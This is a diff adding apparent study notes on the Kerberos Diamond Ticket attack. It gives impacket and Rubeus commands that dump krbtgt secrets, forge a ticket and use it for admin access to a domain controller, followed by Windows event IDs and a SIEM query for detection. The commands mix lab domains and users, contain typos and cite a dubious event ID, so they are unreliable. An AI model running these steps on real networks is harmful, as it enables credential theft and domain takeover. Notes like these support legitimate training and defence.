@@ -176,6 +176,41 @@ q
 - AES256 Key: Often required to modify PACs embedded within TGTs.
 - Administrative Access: Initial access to a high-privilege account to extract cryptographic material.
   
+#collect prequest
+impacket-secretsdump MARVEL.local/hawkeye:@192.168.154.134 -just-dc-user krbtgt
+nxc ldap 192.168.154.134 -u fcastle -p Password@123 --get-sid
   
+#let's create ticket.
+impacket-ticketer -request -domain 'MARVEL.local' -user 'fcastle' -password 'Password@123' -nthash 'c90bf74688c024687385328ca2616f5b' -aesKey '9c8112d6397758b1c23debf624c5bb655ae10ed793d2f224bd878005ad451d78' -domain-sid 'S-1-5-21-3614020701-506922700-4184706594' fcastle
+
+#using the ticket .
+export KRB5CCNAME=sanjeet.ccache; impacket-psexec ignite.local/sanjeet@dc.ignite.local -dc-ip 192.168.1.48 -target-ip 192.168.1.48 -k -no-pass
+
+#using the rubeus and mimikatz .
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:fcaslte /ticketuserid:1107 /groups:512 /krbkey:<aes key>
+
+rubeus.exe asktgs /ticket: <paste the above copied ticket> /service:cifs/dc.ignite.local /ptt /nowrap
+
+dir \\dc.ignite.localc$
+
+
+#detection
+4769 (Service Ticket Request): Detects forged TGT use. Indicators: Unusual account names, high privileges (e.g., Domain Admins), and requests from abnormal IPs.
+4624 (Successful Account Logon): Look for Logon Type 3 (network logons) from unexpected hosts or elevated privileges for non-admin accounts.
+4678 (Privileges Assigned to Logon): Detects special privileges (e.g., SeDebugPrivilege) assigned to non-privileged accounts.
+4713 (Kerberos Policy Changed): Flags changes to ticket lifetimes or other Kerberos policies.
+4625 (Failed Logon): Repeated failures for privileged accounts or from suspicious IPs.
+Detection Strategies
+
+Ticket Lifetime: Compare Ticket Lifetime in Event ID 4769 with policy norms to spot anomalies.
+Privilege Correlation: Track elevated privileges or sensitive SPN access by standard users.
+Unusual Encryption Types: Detect rarely used encryption like RC4 in Event ID 4769.
+TGT Usage: Monitor for identical TGTs used across multiple IPs or locations.
+
+
+SIEM search query :
+| search ServiceName IN ("Domain Admins", "Enterprise Admins")
+| stats count by AccountName, IPAddress, ServiceName
+| where count > 5
 
 ```
